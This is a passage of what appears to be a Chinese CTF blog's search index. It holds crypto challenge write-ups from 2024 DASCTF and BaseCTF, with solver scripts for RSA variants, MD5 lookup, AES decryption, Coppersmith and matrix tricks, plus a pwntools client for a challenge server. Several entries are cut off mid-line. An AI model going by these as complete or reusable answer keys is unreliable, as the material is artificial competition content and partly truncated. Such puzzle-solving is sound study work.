f.write(f'c = {c}') output 太长了，不放这里 思路 求解p 代码又臭又长，观察代码可以发现 $$ e_2和phi_2 $$可以直接用来求解。 $$ e_2d_2=1+(p-1)(p-2)(q-2)(r-2)$$ 有 $$ e_2d_2-1=k(p-1) $$ 再 $$ 2^{e_2d_2}-2 \\equiv 2^{k(p-1)} \\bmod p $$ 那么就可以通过费马小定理和gcd求解p 即 $$ p=\\gcd(2^{e_2d_2}-2 \\bmod n,2) $$ 即 $$ p=\\gcd(pow(2,e_2d_2-1,n)-1,n) $$求解flag mm就是m转成二进制，长度是length（用t表示），生成了一个随机列表s， $$s=a^t ，a为随机数$$,然后在逐位加密，若为0，则为s，否则为ls，其中l是一个固定数字，且不是mod p情况下的二次剩余，但是t为偶数，那么s为二次剩余，所以每一位去还原判断是否为二次剩余即可 exp from Crypto.Util.number import * #数据 p = GCD(pow(2,ed-1,n)-1,n) flag = \"\" for i in range(len(c)): if(pow(c[i],(p-1)//2,p) == 1): flag += \"0\" else: flag += \"1\" print(long_to_bytes(int(flag,2))) ","date":"2024-12-12","objectID":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/:2:3","tags":["crypto"],"title":"2024DASCTF暑期—Crypto复现","uri":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/"},{"categories":["CTF"],"content":"总结 最后两道题都是格了，是我的未知领域，就不写了，看别人的wp也是一脸懵逼，自己还是需要努力追赶别人的步伐，不能被落下太多。 ","date":"2024-12-12","objectID":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/:3:0","tags":["crypto"],"title":"2024DASCTF暑期—Crypto复现","uri":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/"},{"categories":["CTF"],"content":"week1の题目 ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:0","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"你会算MD吗 task import hashlib flag='BaseCTF{}' output=[] for i in flag: my_md5=hashlib.md5() my_md5.update(i.encode()) output.append(my_md5.hexdigest()) print(\"output =\",output) ''' output = ['9d5ed678fe57bcca610140957afab571', '0cc175b9c0f1b6a831c399e269772661', '03c7c0ace395d80182db07ae2c30f034', 'e1671797c52e15f763380b45e841ec32', '0d61f8370cad1d412f80b84d143e1257', 'b9ece18c950afbfa6b0fdbfa4ff731d3', '800618943025315f869e4e1f09471012', 'f95b70fdc3088560732a5ac135644506', '0cc175b9c0f1b6a831c399e269772661', 'a87ff679a2f3e71d9181a67b7542122c', '92eb5ffee6ae2fec3ad71c777531578f', '8fa14cdd754f91cc6554c9e71929cce7', 'a87ff679a2f3e71d9181a67b7542122c', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '0cc175b9c0f1b6a831c399e269772661', 'e4da3b7fbbce2345d7772b0674a318d5', '336d5ebc5436534e61d16e63ddfca327', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '8fa14cdd754f91cc6554c9e71929cce7', '8fa14cdd754f91cc6554c9e71929cce7', '45c48cce2e2d7fbdea1afc51c7c6ad26', '336d5ebc5436534e61d16e63ddfca327', 'a87ff679a2f3e71d9181a67b7542122c', '8f14e45fceea167a5a36dedd4bea2543', '1679091c5a880faf6fb5e6087eb1b2dc', 'a87ff679a2f3e71d9181a67b7542122c', '336d5ebc5436534e61d16e63ddfca327', '92eb5ffee6ae2fec3ad71c777531578f', '8277e0910d750195b448797616e091ad', '0cc175b9c0f1b6a831c399e269772661', 'c81e728d9d4c2f636f067f89cc14862c', '336d5ebc5436534e61d16e63ddfca327', '0cc175b9c0f1b6a831c399e269772661', '8fa14cdd754f91cc6554c9e71929cce7', 'c9f0f895fb98ab9159f51fd0297e236d', 'e1671797c52e15f763380b45e841ec32', 'e1671797c52e15f763380b45e841ec32', 'a87ff679a2f3e71d9181a67b7542122c', '8277e0910d750195b448797616e091ad', '92eb5ffee6ae2fec3ad71c777531578f', '45c48cce2e2d7fbdea1afc51c7c6ad26', '0cc175b9c0f1b6a831c399e269772661', 'c9f0f895fb98ab9159f51fd0297e236d', '0cc175b9c0f1b6a831c399e269772661', 'cbb184dd8e05c9709e5dcaedaa0495cf'] ''' 思路：直接利用哈希表去找字符串就行了 exp import hashlib chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^\u0026*()-_=+[]{}|;:,.\u003c\u003e?/~`' hash_to_char = {} for char in chars: md5_hash = hashlib.md5(char.encode()).hexdigest() hash_to_char[md5_hash] = char hashes = ['9d5ed678fe57bcca610140957afab571', '0cc175b9c0f1b6a831c399e269772661', '03c7c0ace395d80182db07ae2c30f034', 'e1671797c52e15f763380b45e841ec32', '0d61f8370cad1d412f80b84d143e1257', 'b9ece18c950afbfa6b0fdbfa4ff731d3', '800618943025315f869e4e1f09471012', 'f95b70fdc3088560732a5ac135644506', '0cc175b9c0f1b6a831c399e269772661', 'a87ff679a2f3e71d9181a67b7542122c', '92eb5ffee6ae2fec3ad71c777531578f', '8fa14cdd754f91cc6554c9e71929cce7', 'a87ff679a2f3e71d9181a67b7542122c', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '0cc175b9c0f1b6a831c399e269772661', 'e4da3b7fbbce2345d7772b0674a318d5', '336d5ebc5436534e61d16e63ddfca327', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '8fa14cdd754f91cc6554c9e71929cce7', '8fa14cdd754f91cc6554c9e71929cce7', '45c48cce2e2d7fbdea1afc51c7c6ad26', '336d5ebc5436534e61d16e63ddfca327', 'a87ff679a2f3e71d9181a67b7542122c', '8f14e45fceea167a5a36dedd4bea2543', '1679091c5a880faf6fb5e6087eb1b2dc', 'a87ff679a2f3e71d9181a67b7542122c', '336d5ebc5436534e61d16e63ddfca327', '92eb5ffee6ae2fec3ad71c777531578f', '8277e0910d750195b448797616e091ad', '0cc175b9c0f1b6a831c399e269772661', 'c81e728d9d4c2f636f067f89cc14862c', '336d5ebc5436534e61d16e63ddfca327', '0cc175b9c0f1b6a831c399e269772661', '8fa14cdd754f91cc6554c9e71929cce7', 'c9f0f895fb98ab9159f51fd0297e236d', 'e1671797c52e15f763380b45e841ec32', 'e1671797c52e15f763380b45e841ec32', 'a87ff679a2f3e71d9181a67b7542122c', '8277e0910d750195b448797616e091ad', '92eb5ffee6ae2fec3ad71c777531578f', '45c48cce2e2d7fbdea1afc51c7c6ad26', '0cc175b9c0f1b6a831c399e269772661', 'c9f0f895fb98ab9159f51fd0297e236d', '0cc175b9c0f1b6a831c399e269772661', 'cbb184dd8e05c9709e5dcaedaa0495cf'] # 恢复 flag flag = ''.join(hash_to_char.get(h, '?') for h in hashes) print(\"恢复的 flag =\", flag) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:1","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"十七倍 task #include \u003cstdio.h\u003e int main() { unsigned char flag[] = \"BaseCTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\"; int i; for (i = 0; i \u003c 40; i++) { flag[i] = flag[i] * 17; } if (flag[0] != 98) { /* �±��Ǵ� 0 ��ʼ�� */ printf(\"CPU Error???\\n\"); return 1; } unsigned char cipher[] = { 98, 113, 163, 181, 115, 148, 166, 43, 9, 95, 165, 146, 79, 115, 146, 233, 112, 180, 48, 79, 65, 181, 113, 146, 46, 249, 78, 183, 79, 133, 180, 113, 146, 148, 163, 79, 78, 48, 231, 77 }; for (i = 0; i \u003c 40; i++) { if (flag[i] != cipher[i]) { printf(\"flag[%d] is wrong, expect %d, got %d.\\n\", i, cipher[i], flag[i]); return 1; } } return 0; } 思路：有点像逆向，flag[i] 被乘以 17 得到 cipher[i]。 因为 flag[i] 是 unsigned char 类型，所以实际计算时会对 256 取模。 为了还原 flag，我们需要对 cipher[i] 除以 17，然后对结果取模 256。 exp cipher = [ 98, 113, 163, 181, 115, 148, 166, 43, 9, 95, 165, 146, 79, 115, 146, 233, 112, 180, 48, 79, 65, 181, 113, 146, 46, 249, 78, 183, 79, 133, 180, 113, 146, 148, 163, 79, 78, 48, 231, 77 ] flag = [(x * pow(17, -1, 256)) % 256 for x in cipher] flag_str = bytes(flag).decode('ascii') print(flag_str) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:2","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"babypack tsak from Crypto.Util.number import * import random flag=b'BaseCTF{}' m=bytes_to_long(flag) bin_m=bin(m)[2:] length=len(bin_m) a=[1] sum=1 for i in range(length-1): temp=random.randint(2*sum+1,4*sum) sum=sum+temp a.append(temp) a=a[::-1] c=0 for i in range(length): if bin_m[i]=='1': c=c+a[i] print(\"a=\",a) print(\"c=\",c) a= [2487264674516612702148381262059366937897201508455413114345031288894980789076145147579418259432661232747375904997965581530362268904008339124626472045717075482791021095030019783589425299870946373246221582957232862473515, 491733695728183987781854883946776199363545034763223630648303216239781071808983441788738994635864262288104702316190256147614095355462666760091586746521889127102395089946736744234701020777747486645716679961505355358205, 110323038758283816811655397189354730775114318542406507944678995133064353922234139010858233544980338693080719766808774615216332973443076471838385315798081800456260331047745824029902641504699030254172864776140503685719, 21329601123439484788549839891633989762344638209267595412456647269024794605613697213699096256470155035750114059504925376661660484839061252258268241386676023785213539005867805566800471943519247336183762390966700950019, 7146972597944713271040951137457604863561388249875746261956055482229418349264570561740906104126974792505856583850338097727129246644471065603435449813884941071413766137227119139128098345457922432088128969598942863267, 1346101131622672931978096423414991055086097907048045187836881598919564312718270178534519827267497280433625574785132174894812908583233359458000469975702103413693480199742325839719191134247009906270778775450756715188, 431832097768527518676165198802192386603746291434967601504548859319580699889723090943427634867984592194172569910901514799190511020246917662162535632202054961537707269684557393598823535364874075052250490284484829188, 140385263282271996264759155211641776877746297983736897311922733831813190094504225023609340831846735540994403916688230922925129855025970272950216444321463493579227283703118512150491635819942098587286980862817753505, 34223371325515207445588748757581712557393912157235932688701226001484995652561037930828670928779595410194265999875772181711329727812185265441887453894003309876654082495957062628413923487565276953961953102939899664, 11277905223110088306111589808536546872836546320235997789453098291242971723694602770076671423955063276020078678714571127064308764611705435202479293805661470178917099557275252963592432838615626750886647727435412727, 2615533435460831263145388899927800470846179005257762751742107113431800042995970550154282940437470113325491219189765587324789634252029440596113709555932091761129000675863727140738692649309833681187804499985953136, 936680841170458882946412959909966575946011948314629933325082014426837165501136249855420901858482634295013806361789689361684904674438042695516337484436348646919308417999556756779144910987756875858573687134864914, 240803995584844951172124454225548986410808735949094019867567366838810221297826531921690948148961695516283629928962961745839887826049348862278548294987215333063020792491250359616172365439958324315638641990190536, 74980313650452416147684959971591530004150916322659108850519926847892455755211157414650129501071119906261853154503022754482691495645170933619292755026582075009055897885581671027043347130782615603358690889357969, 17373734350550516610959609643239951947839958095899981508834140825450716407631617618229082722622331706459216379319570540046133821392793975119423828799726656124807834541043219269949459907314628636546219059231483, 4383939698435145446949414991318424065438281430941348230548310095735465803169460840233678696507780083107318568406471009158126616954496458697727524252433591785759305622568557705826283690985480130620325779855269, 1070435075033499499988967771003353861621342562651011567215908784740129578236135452228720299864117045007232989018924013752836270314752592099997410344317383430641687448457000377071747633795773722163076615405153, 3546130243995132911500239","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:3","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"babyrsa task from Crypto.Util.number import * flag=b'BaseCTF{}' m=bytes_to_long(flag) n=getPrime(1024) e=65537 c=pow(m,e,n) print(\"n =\",n) print(\"e =\",e) print(\"c =\",c) \"\"\" n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323 e = 65537 c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832 \"\"\" 思路：n为素数，直接对n求phi求解 exp n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323 e = 65537 c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832 from Crypto.Util.number import * phi=n-1 d=inverse(e,phi) m=pow(c,d,n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:4","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"ez_math task import numpy as np from Crypto.Util.number import * a, b, c, d = [getPrime(128) for _ in range(4)] point1 = a * d point2 = b * c matrix2 = [[0, a, b], [0, c, d]] flag = b\"flag{test_flag}\" flag = bytes_to_long(flag) def randomArray(): upper = [[1, 0, 0], [0, 1, 0], [0, 0, 1]] low = [[1, 0, 0], [0, 1, 0], [0, 0, 1]] for i in range(3): for j in range(i+1, 3): upper[i][j] = getPrime(128) low[j][i] = getPrime(128) result = np.array(upper) @ np.array(low) return result A = np.array([[flag, 0, 0]] + matrix2) B = randomArray() MAT = A @ B print(point1) print(point2) print(MAT) ''' 85763755029292607594055805804755756282473763031524911851356658672180185707477 70470862191594893036733540494554536608294230603070251013536189798304544579643 [[73595299897883318809385485549070133693240974831930302408429664709375267345973630251242462442287906226820558620868020093702204534513147710406187365838820773200509683489479230005270823245 46106113894293637419638880781044700751458754728940339402825975283562443072980134956975133603010158365617690455079648357103963721564427583836974868790823082218575195867647267322046726830 161159443444728507357705839523372181165265338895748546250868368998015829266587881868060439602487400399254839839711192069105943123376622497847079185] [13874395612510317401724273626815493897470313869776776437748145979913315379889260408106588331541371806148807844847909 17025249852164087827929313934411832021160463738288565876371918871371314930048841650464137478757581505369909723030523 59510107422473463833740668736202898422777415868238817665123293560097821015330] [11314088133820151155755028207579196628679021106024798818326096960197933616112389017957501267749946871903275867785729 13883500421020573457778249958402264688539607625195400103961001780695107955462968883861677871644577542226749179056659 48528427402189936709203219516777784993195743269405968907408051071264464132448]] ''' 思路： 1.非预期直接乘开，可以发现矩阵中flag为公因子，直接GCD import numpy as np from Crypto.Util.number import GCD, long_to_bytes MAT = np.array([ [73595299897883318809385485549070133693240974831930302408429664709375267345973630251242462442287906226820558620868020093702204534513147710406187365838820773200509683489479230005270823245, 46106113894293637419638880781044700751458754728940339402825975283562443072980134956975133603010158365617690455079648357103963721564427583836974868790823082218575195867647267322046726830, 161159443444728507357705839523372181165265338895748546250868368998015829266587881868060439602487400399254839839711192069105943123376622497847079185], [13874395612510317401724273626815493897470313869776776437748145979913315379889260408106588331541371806148807844847909, 17025249852164087827929313934411832021160463738288565876371918871371314930048841650464137478757581505369909723030523, 59510107422473463833740668736202898422777415868238817665123293560097821015330], [11314088133820151155755028207579196628679021106024798818326096960197933616112389017957501267749946871903275867785729, 13883500421020573457778249958402264688539607625195400103961001780695107955462968883861677871644577542226749179056659, 48528427402189936709203219516777784993195743269405968907408051071264464132448] ]) flag = GCD(MAT[0, 0], MAT[0, 1], MAT[0, 2]) print(long_to_bytes(flag)) 2.预期做法：利用矩阵的性质，矩阵A计算行列式就是flag*(ad-bc) import sympy as sp from Crypto.Util.number import * # 定义矩阵 c = sp.Matrix([ [73595299897883318809385485549070133693240974831930302408429664709375267345973630251242462442287906226820558620868020093702204534513147710406187365838820773200509683489479230005270823245, 46106113894293637419638880781044700751458754728940339402825975283562443072980134956975133603010158365617690455079648357103963721564427583836974868790823082218575195867647267322046726830, 161159443444728507357705839523372181165265338895748546250868368998015829266587881868060439602487400399254839839711192069105943123376622497847079185], [138743956125103174017242736268154938974703138697767764377481459799133153798892604081065883315413718061","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:5","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"mid_math task import numpy as np from Crypto.Util.number import * a, b, c, d = [getPrime(128) for _ in range(4)] point1 = a * d point2 = b * c matrix2 = [[0, a, b], [0, c, d]] flag = b\"flag{test_flag}\" flag = bytes_to_long(flag) def randomArray(): upper = [[1, 0, 0], [0, 1, 0], [0, 0, 1]] low = [[1, 0, 0], [0, 1, 0], [0, 0, 1]] for i in range(3): for j in range(i+1, 3): upper[i][j] = getPrime(128) low[j][i] = getPrime(128) result = np.array(upper) @ np.array(low) return result A = np.array([[flag, 0, 0]] + matrix2) B = randomArray() C = randomArray() MAT = C @ A @ B print(point1) print(point2) print(MAT) ''' 65540596822333029826884315503808996273733737079814345540607878287618419734231 45151244176940366132774311848077675849486332018843894072137609985463616792271 [[9259505595451159514948336330303511539525155092949382077995385373332083424570340733825203563332256599256361679775371565817159463557158551820090084800254999338417057682355404780422980119717238594927467956675771042145306399815569005775907169857728757334979422594358 3700462282298785820527479428312072678870010244861115107206951164684911761755437333209293039456840068340334559453608012512177623936248784897843503284633804083281388001236742261832974291349480314135560368365574114042082002559069958228523318326290833422846224288247 20791012146351643571145217310876690226642338279942557085580439219377325884045305279931904540467264182713135410067252835618936836675270813727053937054168296298149405902638242278868020381541490973458957704137657413376043351193] [3802535350808074374431476757195874789213113083310705049856269457737583463559458126494122484246497049005001474007088865512110432486291568737501434666990689483191924384489484665070592656641925905986397402822195880143437724155134584374613878027218950975919679551229 1519642544380087919293814751485424198320747098741960781639133554268321708273309194651985562222274023623071346914239982055028526526058064787882720065775210796950963778381575914964024929110539407721461321785325399699126116201001806816030960662346173275101476487421 8538097185709421082644083672229287227818939415260987123718318427750267353075860559170390896769087600458156859498331152566368881938040799840806164389020986990994328370205184734637870147251004626759120887684269603636183629300] [17987668490992083132878642797176089621188858356259455169173987325310681186627844776077058221612169421636403546746899152917309634315569997105261046388995579843528014810244648968375990949478033964619008761814039733347955609163 7188579142941521685422767412932555782658469950638690886255638896617687421517941457682493542615460990114218059246938237257830976937359020731335958068934235967457123039874441635435388736524907036941379695243043923900290273902 40388963560266769813551191613694768219344365780650048155838802242681775019274045964917142477325170274191702615504062392461666558731638338001971723737440974198823443420018559746335727687]] ''' 思路：和上面的一样 exp import sympy as sp from Crypto.Util.number import * # 定义矩阵 c = sp.Matrix([ [ 9259505595451159514948336330303511539525155092949382077995385373332083424570340733825203563332256599256361679775371565817159463557158551820090084800254999338417057682355404780422980119717238594927467956675771042145306399815569005775907169857728757334979422594358, 3700462282298785820527479428312072678870010244861115107206951164684911761755437333209293039456840068340334559453608012512177623936248784897843503284633804083281388001236742261832974291349480314135560368365574114042082002559069958228523318326290833422846224288247, 20791012146351643571145217310876690226642338279942557085580439219377325884045305279931904540467264182713135410067252835618936836675270813727053937054168296298149405902638242278868020381541490973458957704137657413376043351193 ], [ 380253535080807437443147675719587478921311308331070504985626945773758346355945812649412248424649704900500147400708886551211043248629156873750143466699068948319192438448948466507059265664192590598639740282219588014343772415513458437","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:6","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"ez_rsa task from Crypto.Util.number import * import gmpy2 m=bytes_to_long(b'BaseCTF{th1s_is_fake_fl4g}') e=65537 p=getPrime(512) q=getPrime(512) n=p*q not_phi=(p+2)*(q+2) c=pow(m,e,n) print(n) print(not_phi) print(c) ''' 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205 37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945 ''' 思路：解方程 exp n=96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421 j=96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205 c=37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945 from Crypto.Util.number import * from sympy import * p,q=symbols('p q') eq1=Eq(p*q,n) eq2=Eq((p+2)*(q+2),j) sol=solve((eq1,eq2),(p,q)) print(sol) p=8141718443899971866435611383307659937822484107070436226370768656806495239448624178566680116128893503281864119780033117546021082236554869984932214653357543 q=11859601043451548704239065811750630150121409048356115322381859833767027517389301429046456876409906319499766276197893850146733170630849226147814156555750347 phi=(p-1)*(q-1) d=inverse(65537,phi) m=pow(c,d,n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:7","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"helloCrypto task from Crypto.Util.number import * from Crypto.Cipher import AES from Crypto.Util.Padding import pad import random flag=b'BaseCTF{}' key=random.randbytes(16) print(bytes_to_long(key)) my_aes=AES.new(key=key,mode=AES.MODE_ECB) print(my_aes.encrypt(pad(flag,AES.block_size))) # key1 = 208797759953288399620324890930572736628 # c = b'U\\xcd\\xf3\\xb1 r\\xa1\\x8e\\x88\\x92Sf\\x8a`Sk],\\xa3(i\\xcd\\x11\\xd0D\\x1edd\\x16[\u0026\\x92@^\\xfc\\xa9(\\xee\\xfd\\xfb\\x07\\x7f:\\x9b\\x88\\xfe{\\xae' 思路：简单的AES解密 exp from Crypto.Util.number import long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import unpad key1 = 208797759953288399620324890930572736628 ciphertext = b'U\\xcd\\xf3\\xb1 r\\xa1\\x8e\\x88\\x92Sf\\x8a`Sk],\\xa3(i\\xcd\\x11\\xd0D\\x1edd\\x16[\u0026\\x92@^\\xfc\\xa9(\\xee\\xfd\\xfb\\x07\\x7f:\\x9b\\x88\\xfe{\\xae' key = long_to_bytes(key1) my_aes = AES.new(key=key, mode=AES.MODE_ECB) plaintext = unpad(my_aes.decrypt(ciphertext), AES.block_size) print(plaintext) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:8","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"week2の题目 ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:0","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"铜匠 task from Crypto.Util.number import getPrime, bytes_to_long #from secret import flag flag=b'XXXX' p = getPrime(1024) q = getPrime(1024) n = p * q e = 65537 hint1 = p \u003e\u003e 721 hint2 = q % (2 ** 266) ct = pow(bytes_to_long(flag), e, n) print(hint1) print(hint2) print(n) print(ct) ''' hint1 = 14439249591349619691972392177790365247490839237199085979433418493254022567815148979672690178 hint2 = 90063199151369157959005663017593053931871580139169245885113098598755909124764417 n = 18347545778876678838092757800261556931131930866012101566000425608407193858675622059415995283684230959320874387944052648148677918542763633503231962873204645415818139345588988936580526094727943067102768943117592654029397879665312089518191052154267343886226820785206334238961064175118262578895847281575656290248049404047727756356910896332939145136942219317065063060070725033146788186604738271846183709127655298440696824683099637827282095133642324657860714680107691622056420045091586609974536644773286992447027164350612852922016376888380895187804771279035652496676089183636450028327097084911908336202253562671798012457461 ct = 15659576879410368237140555530527974801613150473447768911067611094143466009251385693099110691602954207905029692682380253595062935017486879899242785756448973466690818942065250284891341066578689696180061755610538867770441139827574063212967027249650509215685566103350688284041405586915563454117672061141919712416360596137520514412607512596079964611672166435592936417138352662031529414118312166411150736015788925026636845744110093161894267707446937939130745326244186579516665160036229715964182962542836836457885170975474737620430886449029488829662146456489724775166105816909257516908496172172266375617868819982791477888289 ''' 分析：很经典的一种copper，入门不难，原题应该是一个复原后差了五六位的题，还需要爆破，懒得写脚本，就用那个题的了 exp from Crypto.Util.number import long_to_bytes, inverse # 给出的线索和密文 h1 = 14439249591349619691972392177790365247490839237199085979433418493254022567815148979672690178 h2 = 90063199151369157959005663017593053931871580139169245885113098598755909124764417 n = 18347545778876678838092757800261556931131930866012101566000425608407193858675622059415995283684230959320874387944052648148677918542763633503231962873204645415818139345588988936580526094727943067102768943117592654029397879665312089518191052154267343886226820785206334238961064175118262578895847281575656290248049404047727756356910896332939145136942219317065063060070725033146788186604738271846183709127655298440696824683099637827282095133642324657860714680107691622056420045091586609974536644773286992447027164350612852922016376888380895187804771279035652496676089183636450028327097084911908336202253562671798012457461 c = 15659576879410368237140555530527974801613150473447768911067611094143466009251385693099110691602954207905029692682380253595062935017486879899242785756448973466690818942065250284891341066578689696180061755610538867770441139827574063212967027249650509215685566103350688284041405586915563454117672061141919712416360596137520514412607512596079964611672166435592936417138352662031529414118312166411150736015788925026636845744110093161894267707446937939130745326244186579516665160036229715964182962542836836457885170975474737620430886449029488829662146456489724775166105816909257516908496172172266375617868819982791477888289 e = 65537 mod=1\u003c\u003c266 '''sage mod = 1\u003c\u003c266 pl = n*inverse_mod(h2, mod) % mod pbar = (h1 \u003c\u003c 721) + pl print(pbar) mod=1\u003c\u003c266 pbar=159283759372043950279417056412033091802265743745598264436861098130148724970544195213191649166147459982084533577625625008771745438626676361992622620990322639458220384654337631035952464187940654223018174399784470272274817163374085649033913063346035230347024202079916218850411102021956717312895699841307436573429 PR.\u003cx\u003e = PolynomialRing(Zmod(n)) for i in range(64): f=pbar+(x*mod*64)+(i\u003c\u003c266) f=f.monic() pp=f.small_roots(X=2^454, beta=0.4) if pp: print(pp[0]) break ''' pbar=159283759372043950279417056412033091802265743745598264436861098130148724970544195213191649166147459982084533577625625008","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:1","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"basic task from Crypto.Util.number import * import socketserver import os import random import base64 import string flag = os.getenv('GZCTF_FLAG').encode() class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u003c BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self): return self._recvall() def handle(self): printable_chars = string.ascii_letters + string.digits + string.punctuation optional=[b'A',b'B',b'C',b'D'] for _ in range(100): secret= ''.join(random.choices(printable_chars, k=16)).encode() select=random.choice(optional) self.send(select) enc=b'' if select==b'A': enc=base64.b64encode(secret) elif select==b'B': enc=secret.hex().encode() elif select==b'C': enc=bytes_to_long(secret) enc=str(enc).encode() elif select==b'D': enc=[i for i in secret] enc=str(enc).encode() self.send(enc) client_send=self.recv() if client_send!=secret: self.send(\"\\nYou wrong!!!!!\") exit() self.send(flag) self.send(b\"\\nConnection has been closed =.= \") self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 9999 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 分析：一个要用pwn去交互的题，给了四种加密方式，他给什么，你返回什么的解密答案，然后一百次就行了，直接写脚本，如果没有win环境没有安装pwn的话pip install pwntools exp from pwn import * import base64 from Crypto.Util.number import * # 连接到服务端 p = remote('challenge.basectf.fun',42917) def decode(secret, select): if select == b'A': return base64.b64decode(secret) elif select == b'B': return bytes.fromhex(secret.decode()) elif select == b'C': return long_to_bytes(int(secret.decode())) else: return bytes(map(int, secret.decode()[1:-1].split(', '))) try: for _ in range(100): # 接收编码方式 encoding_method = p.recv().strip() # 接收编码后的“秘密” encoded_secret = p.recv().strip() # 解码“秘密” secret = decode(encoded_secret, encoding_method) # 发送解码后的“秘密”以验证 p.sendline(secret) # 成功时，接收并打印 flag flag = p.recv().strip() print(f\"Flag: {flag}\") finally: p.close() ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:2","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"mid_math2 task import numpy as np from Crypto.Util.number import * a, b, c = [getPrime(128) for _ in range(3)] d, e, f, h, i, j = [getPrime(1024) for _ in range(6)] A = [[a, b, c], [d, e, f], [h, i, j]] flag = b\"flag{test_flag}\" flag = bytes_to_long(flag) def prod(myList): result = 1 for i in myList: result = result * i return result def randomArray(): upper = [[1, 0, 0], [0, 1, 0], [0, 0, 1]] low = [[1, 0, 0], [0, 1, 0], [0, 0, 1]] for i in range(3): for j in range(i+1, 3): upper[i][j] = getPrime(128) low[j][i] = getPrime(128) result = np.array(upper) @ np.array(low) return result e = getPrime(18) N = getPrime(1024) C = randomArray() #MAT = C @ A @ B MAT = C @ A c = pow(flag, e, 